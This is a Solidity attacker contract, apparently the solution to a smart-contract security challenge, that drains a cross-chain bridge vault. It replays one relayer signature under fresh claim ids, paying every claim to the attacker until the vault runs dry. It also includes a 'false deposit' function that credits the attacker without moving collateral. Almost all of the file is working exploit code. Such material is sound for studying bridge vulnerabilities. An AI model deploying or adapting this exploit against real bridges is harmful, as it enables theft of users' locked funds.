// SPDX-License-Identifier: MIT
// BRIDGE CLAIM-REPLAY DRAIN (signature-malleability-of-binding class).
// Technique: the relayer's signature binds only (txHash, amount) — the on-chain
// claim id is (txHash, logIndex) and submission is permissionless. One observed
// broadcast signature is replayed under fresh logIndex values with an
// attacker-chosen recipient until the vault is empty.
pragma solidity ^0.8.0;

import {CrossChainBridge} from "../challenges/CrossChainBridge.sol";

contract BridgeReplayAttacker {
    CrossChainBridge public immutable bridge;
    address public immutable owner;

    constructor(address _bridge) {
        bridge = CrossChainBridge(_bridge);
        owner = msg.sender;
    }

    /// Replay one broadcast signature `times` times under distinct logIndex
    /// values, paying every claim out to us. Stops when the vault runs dry.
    function replay(bytes32 txHash, uint256 amount, bytes calldata sig, uint256 times) external {
        for (uint256 i = 0; i < times; i++) {
            (bool ok, ) = address(bridge).call(
                abi.encodeWithSelector(
                    CrossChainBridge.withdraw.selector,
                    txHash,
                    10_000 + i, // fresh claim id — same signature, new payout
                    owner,
                    amount,
                    sig
                )
            );
            if (!ok) break; // vault dry
        }
    }

    /// False-deposit variant (Qubit class): credit ourselves on the destination
    /// ledger without ever moving collateral.
    function falseDeposit(uint256 depositId, uint256 amount) external {
        bridge.depositWithPermitData(depositId, amount, hex"");
    }

    receive() external payable {}
}
